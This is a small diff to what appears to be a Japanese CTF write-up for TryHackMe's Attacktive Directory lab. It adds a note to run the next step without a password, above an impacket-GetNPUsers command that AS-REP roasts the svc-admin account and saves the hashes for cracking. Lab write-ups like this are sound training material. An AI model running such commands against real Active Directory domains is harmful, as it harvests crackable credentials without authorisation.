@@ -242,6 +242,7 @@ Version: v1.0.3 (9dad6e1) - 05/24/26 - Ronnie Flathers @ropnop
 
 ## AS-REP Roast
 
+*Passwordを入力せず実行*
 ```zsh
 ┌──(kali㉿kali)-[~/CTF/THM/AttacktiveDirectory]
 └─$ impacket-GetNPUsers -dc-ip 10.67.191.107  -request -outputfile hashes.asreproast THM-AD/svc-admin
